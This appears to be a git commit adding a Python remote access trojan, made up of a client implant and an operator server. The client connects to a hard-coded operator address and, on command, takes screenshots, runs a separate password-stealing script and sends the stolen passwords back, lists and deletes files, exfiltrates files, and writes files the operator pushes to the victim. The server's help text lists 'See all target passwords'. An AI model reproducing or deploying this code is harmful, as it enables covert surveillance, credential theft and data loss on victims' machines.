041933683dfa0ec54c11769f8fbced5382129fa4
Tikay-code <60823827+Tikay-code@users.noreply.github.com>
2021-09-20 17:00:00 +0300

    Add files via upload

---
+++ Client.py
@@ -0,0 +1,129 @@
+import socket
+import base64
+import pyautogui
+import time
+import subprocess
+import os
+import shutil
+import sys
+import win32com.shell.shell as shell
+import winreg
+
+
+
+def get_target_passwords():
+    # don't forget to change "get password.py" file into a exe file when u convert this file into a exe file also
+    os.system('get_passwords.py')
+
+
+try:
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    DISCONNECT = "disconnect"
+    HOST = "192.168.14.66"
+    PORT = 3221
+
+    client.connect((HOST, PORT))
+
+    #print("Connected To {} With The Port {}".format(HOST, PORT))
+    msg = ""
+
+
+except ConnectionResetError:
+    sys.exit(0)
+
+except ConnectionRefusedError:
+    sys.exit(0)
+
+
+try:
+    while True:
+        msg = client.recv(1024).decode("utf-8")
+
+
+        if msg == "screenshot":
+            pyautogui.screenshot("image.png")
+
+            with open("image.png", "rb") as image_file:
+                encode_string = base64.b64encode(image_file.read())
+
+                client.send(bytes(encode_string))
+
+            os.remove("image.png")
+
+        elif msg == "password":
+            get_target_passwords()
+            with open('p.txt', 'rb') as passwords_file:
+                passwords_encode = base64.b64encode(passwords_file.read())
+                client.send(bytes(passwords_encode))
+
+            os.remove('p.txt')
+
+
+        elif msg == "remove":
+            try:
+                FileToRemove = client.recv(10000).decode("utf-8")
+                os.remove(FileToRemove)
+                client.send(bytes(f"The File : {FileToRemove} Removed!", "utf-8"))
+
+            except FileNotFoundError:
+                sys.exit(0)
+
+        elif msg == "ls":
+
+            Files_list = subprocess.run("dir", shell=True, capture_output=True)
+            List = Files_list.stdout.decode()
+            client.send(bytes(List, "utf-8"))
+
+
+        elif msg == "search":
+            DirectoryPath = client.recv(10000).decode("utf-8")
+
+            try:
+                FilesNames = os.listdir(DirectoryPath)
+                FilesInDirectory = []
+
+                for file in FilesNames:
+                    FilesInDirectory.append(file)
+
+                else:
+                    pass
+
+                client.send(bytes("\n".join(FilesInDirectory), "utf-8"))
+
+            except FileNotFoundError:
+                client.send(bytes("Directory Not Found!", "utf-8"))
+
+
+        elif msg == "copy":
+            FileToMoveSrc = client.recv(1024).decode("utf-8")
+
+            with open(FileToMoveSrc, "rb") as FTM:
+                encode_file = base64.b64encode(FTM.read())
+                client.send(bytes(encode_file))
+                FTM.close()
+
+
+        elif msg == "send":
+            FileType = client.recv(100000)
+            SendingFile = client.recv(100000000)
+
+            with open(FileType, "wb") as FT:
+                FT.write(base64.decodebytes(SendingFile))
+
+
+
+        elif msg == "disconnect":
+            sys.exit(0)
+
+
+except ConnectionResetError:
+    sys.exit(0)
+
+except ConnectionRefusedError:
+    sys.exit(0)
+
+except ConnectionAbortedError:
+    sys.exit(0)
+
+except ConnectionError:
+    sys.exit(0)
---
+++ Server.py
@@ -0,0 +1,112 @@
+import socket
+import sys
+import time
+import base64
+import shutil
+
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+HEADER = 64
+HOST = "192.168.14.66"
+PORT = 3221
+
+server.bind((HOST, PORT))
+print("---------------------------------\nHost : {} | PORT : {}\n---------------------------------".format(HOST, PORT))
+
+server.listen(1)
+
+
+def StartControl():
+    client, address = server.accept()
+    print("Connection From {}".format(address[0]))
+
+    while True:
+        try:
+            command = input("Enter Command: ")
+            client.send(bytes(command, "utf-8"))
+
+            if command == "screenshot":
+                Data = client.recv(100000000)
+
+                with open("ClientScreenShot.png", "wb") as fh:
+                    fh.write(base64.decodebytes(Data))
+
+            elif command == "password":
+                PasswordsData = client.recv(100000000)
+
+                with open("passwords.txt", "wb") as pp:
+                    pp.write(base64.decodebytes(PasswordsData))
+
+            elif command == "ls":
+                Files_list = client.recv(300000).decode("utf-8")
+                print(Files_list)
+
+
+            elif command == "remove":
+                FileToRemove = input("Enter Dir / File Name To Remove: ")
+
+                client.send(bytes(FileToRemove, "utf-8"))
+                msgResult = client.recv(1000).decode("utf-8")
+
+                print(msgResult)
+
+            elif command == "search":
+                Directory = input("Enter The Path: ")
+
+                client.send(bytes(Directory, "utf-8"))
+
+                Files = client.recv(100000).decode("utf-8")
+                print("-------------\n" + Files + "\n-------------")
+                #---------------------------------------------------
+
+            elif command == "copy":
+                MoveFileSrc = input("Enter File Src: ")
+                client.send(bytes(MoveFileSrc, "utf-8"))
+
+                GetFileType = input("Enter File Name: ")
+
+                TheMovingFile = client.recv(100000000)
+
+                with open(GetFileType, "wb") as FT:
+                    FT.write(base64.decodebytes(TheMovingFile))
+                    FT.close()
+
+            elif command == "send":
+
+                FileToSend = input("Enter file to send src: ")
+                FileType = input("Enter file type:")
+                client.send(bytes(FileType, "utf-8"))
+
+                with open(FileToSend, "rb") as FTS:
+                    encode_sending_file = base64.b64encode(FTS.read())
+                    client.send(bytes(encode_sending_file))
+
+
+
+
+            elif command == "help":
+                print("""
+password = See all target passwords
+screenshot = Taking a screenshot
+ls = See all files and firs in the active directory
+remove = Remove a file
+search = See files and dirs in path
+copy = Copying file from client to server
+send = Send File From The Server To The Client
+disconnect = Disconnect
+                """)
+
+            elif command == "disconnect":
+                sys.exit(0)
+
+        except ConnectionAbortedError:
+            print("The Client IP {} Has Disconnected".format(address[0]))
+            sys.exit(0)
+
+        except ConnectionResetError:
+            print("The Client IP {} Has Disconnected".format(address[0]))
+            sys.exit(0)
+
+
+StartControl()
